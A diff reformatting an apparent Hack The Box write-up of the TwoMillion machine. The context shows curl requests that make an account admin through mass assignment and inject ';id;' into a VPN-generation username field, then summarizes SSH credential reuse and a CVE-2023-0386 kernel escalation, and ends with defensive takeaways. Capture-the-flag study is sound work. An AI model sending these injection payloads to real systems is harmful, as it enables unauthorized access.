@@ -13,20 +13,8 @@ tags:
   - command-injection
   - dirty-cred
   - kernel
-synced: "2026-11-02 09:58"
+synced: "2026-11-02 12:08"
 ---
-
---
-tags:
-ciber
-htb
-machine
-difficulty: Easy
-os: Linux
-status: Pwned
-ip: ""
-created: 2026-10-16
---
 
 <p align="center">
   <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cd-c843-47e4-97f7-c0a2d69b78ce.png" alt="TwoMillion Avatar" width="220">
@@ -80,34 +68,34 @@ type: Radar
 #- chart data    -#
 #-----------------#
 data:
-item: "ENUM"
+  - item: "ENUM"
     user: "user"
     score: 6
-item: "REAL"
+  - item: "REAL"
     user: "user"
     score: 5.7
-item: "CVE"
+  - item: "CVE"
     user: "user"
     score: 6
-item: "CUSTOM"
+  - item: "CUSTOM"
     user: "user"
     score: 4
-item: "CTF"
+  - item: "CTF"
     user: "user"
     score: 4.3
-item: "ENUM"
+  - item: "ENUM"
     user: "author"
     score: 0
-item: "REAL"
+  - item: "REAL"
     user: "author"
     score: 0
-item: "CVE"
+  - item: "CVE"
     user: "author"
     score: 0
-item: "CUSTOM"
+  - item: "CUSTOM"
     user: "author"
     score: 0
-item: "CTF"
+  - item: "CTF"
     user: "author"
     score: 0
 
@@ -145,25 +133,25 @@ type: Column
 #- chart data    -#
 #-----------------#
 data:
-folder: "PIECE OF CAKE"
+  - folder: "PIECE OF CAKE"
     count: 1228
-folder: "VERY EASY"
+  - folder: "VERY EASY"
     count: 1758
-folder: "EASY"
+  - folder: "EASY"
     count: 7884
-folder: "NOT TOO EASY"
+  - folder: "NOT TOO EASY"
     count: 7570
-folder: "MEDIUM"
+  - folder: "MEDIUM"
     count: 3165
-folder: "A BIT HARD"
+  - folder: "A BIT HARD"
     count: 1183
-folder: "HARD"
+  - folder: "HARD"
     count: 767
-folder: "EXTREMELY HARD"
+  - folder: "EXTREMELY HARD"
     count: 148
-folder: "INSANE"
+  - folder: "INSANE"
     count: 47
-folder: "BRAINFUCK"
+  - folder: "BRAINFUCK"
     count: 154
 
 #-----------------#
@@ -195,9 +183,7 @@ options:
       alias: "Votes"
 ```
 
---
-
---
+---
 
 ## Reconnaissance
 
@@ -330,9 +316,9 @@ The response is `{"message": false}`. We elevate our privileges to admin exploit
 
 ```sh
 curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
-H "Content-Type: application/json" \
--data '{"email":"test@test.com", "is_admin":1}' | jq
+--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
+-H "Content-Type: application/json" \
+--data '{"email":"test@test.com", "is_admin":1}' | jq
 ```
 
 This successfully changes our account to an administrator:
@@ -355,9 +341,9 @@ As an administrator, we now have access to `/api/v1/admin/vpn/generate`. By prov
 
 ```sh
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
--header "Content-Type: application/json" \
--data '{"username":"julicc;id;"}'
+--cookie "PHPSESSID=vvj2ilu855lclbagann0kqds3l" \
+--header "Content-Type: application/json" \
+--data '{"username":"julicc;id;"}'
 ```
 
 This returns command execution output:
@@ -449,16 +435,16 @@ ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
 
 In this machine, we started by interacting with an API to generate invite codes. By tampering with user settings via an insecure API endpoint, we escalated our privileges within the web application to an administrator. This allowed us to access an administrative VPN generation feature vulnerable to Command Injection. From there, we found database credentials which were reused for SSH access. Finally, reading internal emails hinted at a Linux kernel vulnerability in OverlayFS (CVE-2023-0386), which was leveraged to obtain root access.
 
---
+---
 
 ## Post-Engagement & Zettelkasten Notes
 
 ### Key Takeaways & Defense
-**API Mass Assignment**: Restrict object parameter binding so clients cannot tamper with fields like `is_admin`.
-**System Command Injection**: Administrative functions generating files (e.g. OpenVPN certificates) must use safe APIs or sanitize inputs against command delimiters (`;`, `&`, `|`).
-**Kernel Patch Management**: The OverlayFS vulnerability (CVE-2023-0386) demonstrates the critical importance of keeping the Linux kernel updated.
+- **API Mass Assignment**: Restrict object parameter binding so clients cannot tamper with fields like `is_admin`.
+- **System Command Injection**: Administrative functions generating files (e.g. OpenVPN certificates) must use safe APIs or sanitize inputs against command delimiters (`;`, `&`, `|`).
+- **Kernel Patch Management**: The OverlayFS vulnerability (CVE-2023-0386) demonstrates the critical importance of keeping the Linux kernel updated.
 
 ### Atomic Notes to Extract
-[[Web - API - Mass Assignment and Parameter Tampering|Mass Assignment & Parameter Tampering]]
-[[Web - Injection - OS Command Injection in API Parameters|OS Command Injection in API Parameters]]
-[[Linux - PrivEsc - OverlayFS Kernel Exploit|CVE-2023-0386 (OverlayFS Kernel Exploit)]]
+- [[Web - API - Mass Assignment and Parameter Tampering|Mass Assignment & Parameter Tampering]]
+- [[Web - Injection - OS Command Injection in API Parameters|OS Command Injection in API Parameters]]
+- [[Linux - PrivEsc - OverlayFS Kernel Exploit|CVE-2023-0386 (OverlayFS Kernel Exploit)]]
